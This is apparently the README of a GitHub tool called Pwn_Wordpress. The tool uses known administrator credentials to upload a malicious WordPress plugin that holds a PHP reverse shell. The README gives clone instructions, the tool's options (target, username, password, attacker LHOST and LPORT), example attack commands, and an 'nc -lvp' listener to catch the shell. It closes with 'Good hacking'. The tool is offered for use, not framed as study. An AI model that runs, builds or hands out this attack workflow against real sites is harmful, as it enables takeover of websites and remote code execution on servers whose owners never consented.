![LOGO](https://github.com/JoaoPedroMoreira02/Pwn_Wordpress/assets/103542430/7c6e38fe-7fda-4f97-9da1-b1a619f975d2)


# Evil Wordpress Plugin (Malicious)

Malicious, remotely performs an upload of a PHP reverse shell in the form of a plugin on a WordPress site. The exploit is only successful with user credentials, so make sure you know the target username and password and check if the target user has Administrator permissions.

Install by running:

```bash
  git clone https://github.com/JoaoPedroMoreira02/Pwn_Wordpress.git
```
    
## Parameters [Running Script]

Help section (-h)

```bash
usage: Malicious.py [-h] [-t] [-u] [-p] [-L] [-P]

Wordpress Malicious plugin upload

options:
  -h, --help        show this help message and exit
  -t , --target     Target URL
  -u , --username   Wordpress Username
  -p , --password   Wordpress Password
  -L , --LHOST      Attacker IP address
  -P , --LPORT      Attacker LOCAL PORT

./app.py -t http://domain_name.com/wordpress -u User_FOX -p Pass -L 192.168.20.2 -P 4040 

```

Attacking the Target Website: 

```bash 
python3 Malicious.py -t http://<IP or domain_name> -u <Target Username> -p <Target Password> -L <LOCAL IP> -P <LOCAL PORT>

```

Executing Handler

```bash 
nc -lvp {LOCAL PORT}
```

The script will automatically give you the connection. 

***---> In case of complications or disconnection issues, you can just manually trigger the connection at the URL link given by the program <---***
 
***---> Correct Syntax: "http://IP/wordpress | Wrong syntax: http://IP/wordpress/ <---***

## 

- ***Good hacking :)***




